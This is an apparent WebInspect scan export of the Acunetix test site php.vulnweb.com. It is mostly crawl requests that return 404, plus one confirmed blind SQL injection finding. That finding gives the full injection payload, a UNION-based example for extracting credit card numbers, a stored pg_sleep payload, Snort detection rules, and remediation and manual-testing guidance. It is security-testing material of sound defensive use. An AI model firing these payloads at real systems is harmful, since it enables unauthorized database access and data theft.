Content-Type: text/html
Content-Length: 153

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.19.0</center>
</body>
</html>
]]></RawResponse><Request id="E78DA5D156405D07DFC076214DEA63BD"><Method>GET</Method><Path>/medias/js/</Path><File>common_functions</File><Ext>js</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/path-disclosure-unix.html</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="E78DA5D156405D07DFC076214DEA63BD";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="27";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="e32fccce";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1282a105";sc="1";tid="27";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.19.0</center>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:13 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>153</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="AA976105709FC9651F178D0748456EB9"><URL>http://php.vulnweb.com:80/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="AA976105709FC9651F178D0748456EB9"><![CDATA[GET /usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/object.class.php HTTP/1.1
Referer: http://php.vulnweb.com/pictures/path-disclosure-unix.html
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="AA976105709FC9651F178D0748456EB9";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";NodeName="b";Source="StaticParser";tid="89";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="e00a2785";
X-Request-Memo: ID="e1951422";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:14 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="AA976105709FC9651F178D0748456EB9"><Method>GET</Method><Path>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/</Path><File>object.class</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/path-disclosure-unix.html</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="AA976105709FC9651F178D0748456EB9";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";NodeName="b";Source="StaticParser";tid="89";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="e00a2785";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e1951422";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:14 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="5CC34D52BCCF5B5A9768D883B81A271A"><URL>http://php.vulnweb.com:80/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="5CC34D52BCCF5B5A9768D883B81A271A"><![CDATA[GET /usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/xsltTransform.class.php HTTP/1.1
Referer: http://php.vulnweb.com/pictures/path-disclosure-unix.html
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="5CC34D52BCCF5B5A9768D883B81A271A";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";NodeName="b";Source="StaticParser";tid="88";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="b4eb1fe5";
X-Request-Memo: ID="a5b32de2";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 404 Not Found
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:14 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 16

File not found.
]]></RawResponse><Request id="5CC34D52BCCF5B5A9768D883B81A271A"><Method>GET</Method><Path>/usr/local/etc/httpd/htdocs2/destination-ce/destinationce/system/class/</Path><File>xsltTransform.class</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/path-disclosure-unix.html</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="5CC34D52BCCF5B5A9768D883B81A271A";PSID="B6D9A705F9FF68FC5F72211FDD783E27";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";NodeName="b";Source="StaticParser";tid="88";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="b4eb1fe5";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a5b32de2";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>404</StatusCode><StatusDescription>Not Found</StatusDescription><SetCookie /><ResponseBody><![CDATA[File not found.
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:14 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>16</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="4DEEE6CA66FB1CB21E3E80C7281E36DA"><URL>http://php.vulnweb.com:80/userinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uname</AttackParamDescriptor><Issues><Issue id="a6c30cd2-c6e3-4505-92d8-604974e8c573"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4DEEE6CA66FB1CB21E3E80C7281E36DA";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="33";AttackParamDesc="uname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="46";tt="40";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="d62a6f4d";
X-Request-Memo: ID="356d5b17";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

uname=12345%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270&pass=foo]]></AttackHTTPRequest><VulnerabilityID>11299</VulnerabilityID><Severity>4</Severity><Name>Blind SQL Injection (Confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<hp-img src="sql.rgc" /><br /><drc_sqli />


Critical Blind SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. Normal SQL Injection attacks depend in a large measure on an attacker reverse engineering portions of the original SQL query using information gained from error messages.  However, your application can still be susceptible to Blind SQL injection even if no error message is displayed.  If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="4DEEE6CA66FB1CB21E3E80C7281E36DA"><![CDATA[POST /userinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4DEEE6CA66FB1CB21E3E80C7281E36DA";PSID="885A3DDA5BF99592E4ACCDD310484D37";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="33";AttackParamDesc="uname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="12345%2527%2509OR%2509(select%2509ASCII(SUBSTR(schema()%252c1%252c1)))%2509%253c128%2509OR%2509%25274%2527%253d%25270";AttackStringProps="Attack";tid="46";tt="40";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="d62a6f4d";
X-Request-Memo: ID="356d5b17";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

uname=12345%27%09OR%09(select%09ASCII(SUBSTR(schema()%2c1%2c1)))%09%3c128%09OR%09%274%27%3d%270&pass=foo]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:30 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Length: 6004
Set-Cookie: login=test%2Ftest
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>user info</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
	<a href='logout.php'>Logout test</a>	</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>(SELECT pg_sleep(20)) (test)</h2><div class='story'><p>On this page you can visualize or edit you user information.</p></div><div class='story'>
      	  
			<form name="form1" method="post" action="">
				

				
				
				<table border="0" cellspacing="1" cellpadding="4">
					<tr><td valign="top">Name:</td><td><input type="text" value="(SELECT pg_sleep(20))" name="urname" style="width:200px"></td></tr>
					<tr><td valign="top">Credit card number:</td><td><input type="text" value="6341-2736-2836-9533" name="ucc" style="width:200px"></td></tr>
					<tr><td valign="top">E-Mail:</td><td><input type="text" value="test" name="uemail" style="width:200px"></td></tr>
					<tr><td valign="top">Phone number:</td><td><input type="text" value="test" name="uphone" style="width:200px"></td></tr>
					<tr><td valign="top">Address:</td><td><textarea wrap="soft" name="uaddress" rows="5" style="width:200px">test</textarea></td></tr>
					<tr><td colspan="2" align="right"><input type="submit" value="update" name="update"></td></tr>
				</table>
			</form>
			</div><div class='story'><p>You have 0 items in your cart. You visualize you cart <a href='cart.php'>here</a>.</p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
